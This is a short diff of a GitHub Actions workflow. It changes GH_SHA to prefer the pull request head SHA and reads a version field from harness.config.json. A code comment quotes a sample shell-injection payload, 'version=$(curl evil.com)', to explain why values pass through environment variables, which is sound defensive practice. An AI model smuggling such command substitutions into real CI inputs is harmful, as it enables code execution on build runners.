@@ -51,7 +51,7 @@ jobs:
         # allow shell-injection (e.g. version=$(curl evil.com)).
         env:
           GH_REPO: ${{ github.repository }}
-          GH_SHA: ${{ github.sha }}
+          GH_SHA: ${{ github.event.pull_request.head.sha || github.sha }}
         run: |
           version=$(node -e "console.log(JSON.parse(require('fs').readFileSync('harness.config.json','utf8')).version || '')")
           if [ -n "$version" ] && [ "$version" != "0.0.0-pre" ]; then
